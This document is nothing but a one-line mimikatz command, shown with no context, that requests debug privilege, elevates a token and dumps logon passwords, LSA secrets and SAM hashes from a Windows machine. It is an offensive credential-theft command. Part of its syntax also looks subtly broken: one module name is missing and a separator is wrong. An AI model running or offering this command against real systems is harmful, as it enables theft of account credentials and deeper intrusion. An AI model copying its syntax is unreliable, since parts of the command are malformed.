```
mimikatz.exe "privilege::debug" "token:elevate" "sekurlsa::logonpasswords" "lsadump::/inject" "lsadump::sam" "exit"
```